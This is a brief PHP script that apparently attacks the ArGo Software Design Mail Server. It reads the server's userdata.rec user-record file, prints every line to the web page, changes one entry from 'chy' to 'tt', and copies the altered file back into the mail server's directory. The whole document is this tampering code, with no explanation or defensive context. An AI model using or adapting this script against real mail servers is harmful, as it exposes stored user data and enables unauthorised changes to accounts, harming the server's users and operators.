<?php
mkdir("/Program Files/ArGo Software Design/Mail Server/non",0755) ;
$fp = fopen("userdata.rec","r");
$fp1 = fopen("userdata1.rec","w");
while(!feof($fp))
{
$char = fgets($fp,90);
echo $char."<br>";
if($char=="chy\n") $char="tt\n";
fputs($fp1,$char,50);
}
fclose($fp);
fclose($fp1);
 copy("userdata1.rec","c:\\Program Files\\ArGo Software Design\\Mail Server\\non\\userdata.rec") ;
?>

